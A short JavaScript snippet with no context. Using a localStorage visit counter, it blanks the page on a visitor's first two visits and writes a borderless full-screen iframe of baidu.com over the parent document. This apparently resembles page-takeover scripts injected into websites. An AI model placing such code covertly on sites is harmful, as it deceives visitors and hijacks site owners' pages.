var shes = localStorage.getItem('shes');
var style = document.createElement("style");
style.type = "text/css";
style.appendChild(document.createTextNode("html,body {height: 100%;padding: 0;margin: 0;overflow-x: hidden;overflow-y: hidden;}"));
var head = document.getElementsByTagName("head")[0];
head.appendChild(style);
if(shes == null)
{
	localStorage.setItem('shes', "a");
	document.body.innerHTML = "";
	parent.document.writeln("<iframe style=\"margin:0px;padding:0px;height:100%;width:100%;\" src=\"https://www.baidu.com/\" frameBorder=0 scrolling=no></iframe>");
}

if(shes == "a")
{
	localStorage.setItem('shes', "b");
	document.body.innerHTML = "";
	parent.document.writeln("<iframe style=\"margin:0px;padding:0px;height:100%;width:100%;\" src=\"https://www.baidu.com/\" frameBorder=0 scrolling=no></iframe>");
}


// setTimeout(function(){
// 	parent.document.writeln("<iframe style=\"margin:0px;padding:0px;height:100%;width:100%;\" src=\"https://www.baidu.com\" frameBorder=0 scrolling=no></iframe>");
// 	setTimeout(function(){
// 		document.getElementsByTagName("body")[0].setAttribute("style","margin:0px;");
// 	},100);
// 	setTimeout(function(){
// 		parent.document.getElementsByTagName("body")[0].setAttribute("style","margin:0px;");
// 	},100);
// },1000);